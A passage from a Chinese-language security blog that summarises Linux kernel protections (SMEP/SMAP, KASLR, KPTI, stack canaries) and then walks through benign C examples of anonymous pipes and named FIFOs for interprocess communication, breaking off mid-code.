              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>941</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="SMEP-amp-SMAP"><a href="#SMEP-amp-SMAP" class="headerlink" title="SMEP &amp; SMAP"></a>SMEP &amp; SMAP</h2><p>SMEP（Supervisor Mode Execution Prevention，管理模式执行保护）：阻止内核执行用户态传递的代码</p>
<p>SMAP（Supervisor Mode Access Prevention，管理模式访问保护）：禁止内核CPU访问用户空间的数据和执行用户空间的代码</p>
<p>CR4 寄存器的第 20/21 位可以查看是否开启 SMEP/SMAP：</p>
<img src="/2022/09/14/kernel%20protect/1663059789043.png" class width="1663059789043"> 
<h2 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h2><p>KASLR（Kernel Address Space Layout Randomization，内核地址空间布局随机化）：其实就是针对内核的 ASLR</p>
<p>与 ASLR 不同，KASLR 有几个问题：</p>
<ul>
<li>如果用户在暴力破解找 kernel 的位置，会直接导致机器 crash</li>
<li>与电脑的休眠机制不兼容</li>
<li>有很多其他的模块需要或者依赖于知道 kernel 的位置，这些都需要谨慎处理：<ul>
<li>开启 <code>kptr_restrict</code> 系统调用防止内核地址泄露到用户空间（普通用户都无法读取内核符号地址）</li>
<li>使用 <code>dmesg_restrict</code> 防止 <code>dmesg</code> 泄露内核地址（限制非特权用户使用 dmesg 查看内核日志缓冲区中的消息）</li>
<li><code>/var/log/messages</code> 应该设置为只有 <code>root</code> 用户能访问（该文件中存放的就是系统的日志信息）</li>
</ul>
</li>
</ul>
<h2 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h2><p>KPTI（Kernel PageTable Isolation，内核页表隔离）：完全分离用户空间与内核空间页表来解决页表泄露</p>
<ul>
<li>如果没有 KPTI，每当执行用户空间代码时，Linux 会在其分页表中保留整个内核内存的映射，并保护其访问，这样做的优点是当应用程序向内核发送系统调用或收到中断时，内核页表始终存在，可以避免绝大多数上下文交换相关的开销（TLB 刷新、页表交换等）</li>
<li>开启 KPTI 后，为了彻底防止用户程序获取内核数据，可以令内核地址空间和用户地址空间使用两组页表集</li>
</ul>
<h2 id="Stack-Protector"><a href="#Stack-Protector" class="headerlink" title="Stack Protector"></a>Stack Protector</h2><p>在内核中也是有 Stack Protector 的，编译内核时设置 CONFIG_CC_STACKPROTECTOR 选项即可 </p>
<ul>
<li>每个函数执行前先向栈帧顶部插入一个 canary 值以确保顺序的栈上溢在破坏到父函数栈帧前必须要先破坏 canary</li>
<li>每个函数返回之前会检测当前栈帧中的 canary 是否被修改，若被修改则代表发生了溢出，就会替换该函数的返回值为 <code>__stack_chk_fail</code></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/12/Principles%EF%BC%9APipe%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/12/Principles%EF%BC%9APipe%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：Pipe底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-12 21:36:48" itemprop="dateCreated datePublished" datetime="2022-09-12T21:36:48+08:00">2022-09-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-25 14:35:08" itemprop="dateModified" datetime="2022-11-25T14:35:08+08:00">2022-11-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Pipe 简述</strong></p>
<p>进程用户空间是相互独立的，一般而言是不能相互访问的，但很多情况下进程间需要互相通信，来完成系统的某项功能，进程通过与内核及其它进程之间的互相通信来协调它们的行为，管道就是作为进程间的一种通信方式</p>
<ul>
<li>内核申请一块缓存区，这个缓存区留有两个接口，分别接在两个不同的进程上</li>
<li>这个缓冲区不需要很大，它被设计成为环形的数据结构，以便可以被循环利用：<ul>
<li>当管道中没有信息的话，从管道中读取的进程会等待，直到另一端的进程放入信息</li>
<li>当管道被放满信息的时候，尝试放入信息的进程会等待，直到另一端的进程取出信息</li>
<li>当两个进程都终结的时候，管道也自动消失</li>
</ul>
</li>
</ul>
<p>管道分为无名管道(pipe)和有名管道(FIFO)两种：</p>
<ul>
<li>无名管道：只能用于 <strong>公共祖先</strong> 的两个进程间的通信，原因是自己创建的管道在别的进程中并不可见</li>
<li>有名管道：可用于同一系统中的任意两个进程间的通信</li>
</ul>
<p><strong>Pipe 案例</strong></p>
<p>父子进程通信（无名管道）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 父子共享文件描述符 */</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> ret = pipe(fd);</span><br><span class="line">	<span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;pipe error:&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;fork error:&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123; <span class="comment">/* 子进程 读数据，关闭写端fd[1] */</span></span><br><span class="line">		close(fd[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> rea = read(fd[<span class="number">0</span>],buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="keyword">if</span>(rea==<span class="number">0</span>)&#123;</span><br><span class="line">			perror(<span class="string">&quot;read finish\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* 将读出的数据写到屏幕上 */</span></span><br><span class="line">		write(<span class="number">1</span>, buf, rea);</span><br><span class="line">		close(fd[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123; <span class="comment">/* 父进程写书据，关闭读端fd[0] */</span></span><br><span class="line">		close(fd[<span class="number">0</span>]);</span><br><span class="line">		write(fd[<span class="number">1</span>], <span class="string">&quot;hello pipe\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;hello pipe\n&quot;</span>));</span><br><span class="line">		close(fd[<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>父进程向管道中写入数据</li>
<li>儿进程从管道中读取数据</li>
<li>结果：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  exp ./pipe1</span><br><span class="line">hello pipe</span><br></pre></td></tr></table></figure>
<p>兄弟进程通信（无名管道）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">2</span>];   </span><br><span class="line">    <span class="keyword">int</span> ret = pipe(fd);  </span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[pipe create file] &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ( ; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>)</span><br><span class="line">            perror(<span class="string">&quot;[creator process file:]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>) &#123; <span class="comment">// child1</span></span><br><span class="line">        dup2(fd[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">/* 设置child1的标准输出为pipe */</span></span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        execlp(<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">1</span>) &#123; <span class="comment">// child2</span></span><br><span class="line">        dup2(fd[<span class="number">0</span>], <span class="number">0</span>); <span class="comment">/* 设置child2的标准输入为pipe */</span>   </span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line">        execlp(<span class="string">&quot;grep&quot;</span>, <span class="string">&quot;grep&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">2</span>) &#123; <span class="comment">// parent </span></span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> wpid;</span><br><span class="line">        <span class="keyword">while</span> ( wpid = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, WNOHANG) != <span class="number">-1</span>) &#123; <span class="comment">/* 回收子进程 */</span></span><br><span class="line">            <span class="comment">/* 当waitpid调用次数过多时,也会返回&#x27;-1&#x27; */</span></span><br><span class="line">            <span class="keyword">if</span> (wpid == <span class="number">1</span>) <span class="comment">/* PID为&#x27;1&#x27;的是init进程(显然不可能死亡) */</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (wpid == <span class="number">0</span>) <span class="comment">/* 如果设置了选项WNOHANG,而调用中waitpid发现没有已退出的子进程可收集,则返回0 */</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;child dide pid = %d\n&quot;</span>, wpid);</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pipeWrite = %d,  pipeRead = %d\n&quot;</span>, fd[<span class="number">1</span>], fd[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>设置 <code>child1</code> 的标准输出为 <code>pipe</code>，执行 <code>execlp(&quot;ls&quot;, &quot;ls&quot;, NULL)</code></li>
<li>设置 <code>child2</code> 的标准输入为 <code>pipe</code>，执行 <code>execlp(&quot;grep&quot;, &quot;grep&quot;, &quot;pipe&quot;, NULL)</code></li>
<li>先把 <code>child1</code> 的结果输出到 <code>pipe</code> 中，再把 <code>pipe</code> 中的数据输入到 <code>child2</code> 中</li>
<li>结果：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  exp ./pipe2</span><br><span class="line">pipe1</span><br><span class="line">pipe1.c</span><br><span class="line">pipe2</span><br><span class="line">pipe2.c</span><br><span class="line">pipeWrite = 4,  pipeRead = 3</span><br><span class="line">➜  exp ls | grep pipe         </span><br><span class="line">pipe1</span><br><span class="line">pipe1.c</span><br><span class="line">pipe2</span><br><span class="line">pipe2.c</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：waitpid() 函数详解</li>
<li>调用了 waitpid()，父类就立即阻塞自己，由 waitpid() 自动分析是否当前进程的某个子进程是否已经退出：<ul>
<li>如果让它找到了这样一个已经变成僵尸的子进程，waitpid() 就会收集这个子进程的信息，并把它彻底销毁后返回</li>
<li>如果没有找到这样一个子进程，waitpid() 就会一直阻塞在这里，直到有一个出现为止</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *status, <span class="keyword">int</span> options)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>pid&gt;0 时：<strong>只等待进程ID等于pid的子进程</strong>，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid 就会一直等下去</li>
<li>pid=-1 时：<strong>等待任何一个子进程退出</strong>，没有任何限制，此时 waitpid() 和 wait() 的作用一模一样</li>
<li>pid=0 时：<strong>等待同一个进程组中的任何子进程</strong>，如果子进程已经加入了别的进程组，waitpid() 不会对它做任何理睬</li>
<li>pid&lt;-1 时：<strong>等待一个指定进程组中的任何子进程</strong>，这个进程组的ID等于pid的绝对值</li>
<li>无论哪种情况，WNOHANG 模式均不予等待（把上述案例中的 WNOHANG 去掉就很好验证）</li>
</ul>
<p>两个无关进程通信（有名管道）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATHNAME1 <span class="meta-string">&quot;./fifo1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATHNAME2 <span class="meta-string">&quot;./fifo2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_err</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(str);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(pid&gt;<span class="number">0</span>) <span class="comment">/* 父进程,负责接收数据 */</span></span><br><span class="line">	&#123;</span><br><span class="line">		fd[<span class="number">0</span>] = open(PATHNAME1,O_RDWR);</span><br><span class="line">		<span class="keyword">if</span>(fd[<span class="number">0</span>] == <span class="number">-1</span>)&#123;</span><br><span class="line">			print_err(<span class="string">&quot;open fail:&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)	</span><br><span class="line">		&#123;</span><br><span class="line">			read(fd[<span class="number">0</span>],buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;rcv:%s&quot;</span>,buf);</span><br><span class="line">			bzero(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="comment">/* 子进程,负责传输数据 */</span></span><br><span class="line">	&#123;</span><br><span class="line">		fd[<span class="number">1</span>] = open(PATHNAME2,O_RDWR);</span><br><span class="line">		<span class="keyword">if</span>(fd[<span class="number">1</span>] == <span class="number">-1</span>)&#123;</span><br><span class="line">			print_err(<span class="string">&quot;open fail:&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			read(<span class="number">0</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">			write(fd[<span class="number">1</span>],buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">			bzero(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATHNAME1 <span class="meta-string">&quot;./fifo1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATHNAME2 <span class="meta-string">&quot;./fifo2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_err</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(str);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> ret[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	ret[<span class="number">0</span>] = mkfifo(PATHNAME1,<span class="number">0664</span>); <span class="comment">/* 创建一个有名管道-fifo1 */</span></span><br><span class="line">	<span class="keyword">if</span>(ret[<span class="number">0</span>] == <span class="number">-1</span> &amp;&amp; errno!=EEXIST)&#123;</span><br><span class="line">		print_err(<span class="string">&quot;mkfifo fail:&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	ret[<span class="number">1</span>] = mkfifo(PATHNAME2,<span class="number">0664</span>); <span class="comment">/* 创建一个有名管道-fifo2 */</span></span><br><span class="line">	<span class="keyword">if</span>(ret[<span class="number">1</span>] == <span class="number">-1</span> &amp;&amp; errno!=EEXIST)&#123;</span><br><span class="line">		print_err(<span class="string">&quot;mkfifo fail:&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pid&gt;<span class="number">0</span>) <span class="comment">/* 父进程,负责传输数据 */</span></span><br><span class="line">	&#123;</span><br><span class="line">		fd[<span class="number">0</span>] = open(PATHNAME1,O_RDWR);</span><br><span class="line">		<span class="keyword">if</span>(fd[<span class="number">0</span>] == <span class="number">-1</span>)&#123;</span><br><span class="line">			print_err(<span class="string">&quot;open fail:&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			read(<span class="number">0</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">			write(fd[<span class="number">0</span>],buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">			bzero(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="comment">/* 子进程,负责接收数据 */</span></span><br><span class="line">	&#123;</span><br><span class="line">		fd[<span class="number">1</span>] = open(PATHNAME2,O_RDWR);</span><br><span class="line">		<span class="keyword">if</span>(fd[<span class="number">1</span>] == <span class="number">-1</span>)&#123;</span><br><span class="line">			print_err(<span class="string">&quot;open fail:&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			read(fd[<span class="number">1</span>],buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;rcv data:%s&quot;</span>,buf);</span><br><span class="line">			bzero(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span 